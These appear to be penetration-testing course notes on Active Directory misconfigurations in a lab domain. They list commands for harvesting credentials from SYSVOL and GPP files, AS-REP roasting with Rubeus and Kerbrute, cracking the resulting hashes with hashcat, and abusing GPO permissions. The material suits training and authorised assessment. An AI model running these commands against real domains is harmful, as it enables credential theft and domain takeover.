### Miscellaneous Misconfigurations

```
# Enumerating for MS-PRN Printer Bug 

PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

### Enumerating DNS Records

```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5                 # Using adidnsdump
head records.csv                                                      # Viewing the Contents of the records.csv File

adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r              # Using the -r Option to Resolve Unknown Records
head records.csv                                                      # Finding Hidden Records in the records.csv File
```

### Other Misconfigurations

```
# Finding Passwords in the Description Field using Get-Domain User

PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

# Checking for PASSWD_NOTREQD Setting using Get-DomainUser

PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts

```
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Finding a Password in the Script
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

### Group Policy Preferences (GPP) Passwords

```
# Group Policy Preferences (GPP) Passwords

# When a new GPP is created, an .xml file is created in the SYSVOL share, 
# which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

# These files can contain an array of configuration data and defined passwords. 
# The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, 
# which can be used to decrypt the password. 
# Any domain user can read these files as they are stored on the SYSVOL share, 
# and all authenticated users in a domain, by default, have read access to this domain controller shar

# Decrypting the Password with gpp-decrypt

gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Locating & Retrieving GPP Passwords with CrackMapExec

crackmapexec smb -L | grep gpp

# Using CrackMapExec's gpp_autologin Module

crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### ASREPRoasting

```
# It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the 
# Do not require Kerberos pre-authentication setting enabled. 
# Many vendor installation guides specify that their service account be configured in this way.

# The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. 
# If an attacker has GenericWrite or GenericAll permissions over an account, 
# they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password 
# before disabling the attribute again.
```

```
# Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. 
# Retrieving AS-REP in Proper Format using Rubeus

PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# We can then crack the hash offline using Hashcat with mode 18200 :

hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt              # Cracking the Hash Offline with Hashcat

# When performing user enumeration with Kerbrute, 
# the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt       # Retrieving the AS-REP Using Kerbrute

# With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit 
# to hunt for all users with Kerberos pre-authentication not required.

# Hunting for Users with Kerberoast Pre-auth Not Required:

GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

### Group Policy Object (GPO) Abuse

[group3r](https://github.com/Group3r/Group3r)
[ADRecon](https://github.com/sense-of-security/ADRecon) 
[PingCastle](https://www.pingcastle.com/)
[Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO)

```
# GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

# We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. 
# We can also use group3r, ADRecon, PingCastle, among others, to audit the security of GPOs in a domain.
# Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.
```

```
# Enumerating GPO Names with PowerView

PS C:\htb> Get-DomainGPO | Select displayname

# Enumerating GPO Names with a Built-In Cmdlet  (If Group Policy Management Tools are installed)
 
PS C:\htb> Get-GPO -All | Select DisplayName

# Enumerating Domain User GPO Rights

PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, 
# which we could leverage to give ourselves full control over the GPO 
# and pull off any number of attacks that would be pushed down to any users 
# and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO 
# to see the display name of the GPO.

# Converting GPO GUID to Name

PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

# Checking in BloodHound, we can see that the Domain Users group has several rights over the Disconnect Idle RDP GPO, 
# which could be leveraged for full control of the object.

# If we select the GPO in BloodHound and scroll down to Affected Objects on the Node Info tab, 
# we can see that this GPO is applied to one OU, which contains four computer objects.

# We could use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as 
# adding a user that we control to the local admins group on one of the affected hosts, 
# creating an immediate scheduled task on one of the hosts to give us a reverse shell, 
# or configure a malicious computer startup script to provide us with a reverse shell or similar.

# If we found an editable GPO that applies to an OU with 1,000 computers, 
# we would not want to make the mistake of adding ourselves as a local admin to that many hosts.
```

### Onwards

```
# We have seen various misconfigurations that we may run into during an assessment, 
# and there are many more that will be covered in more advanced Active Directory modules. 
# It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

# In the following few sections, we will briefly cover attacking AD trusts. 
# This is a vast and complicated topic that will be covered in-depth in a later module.
```
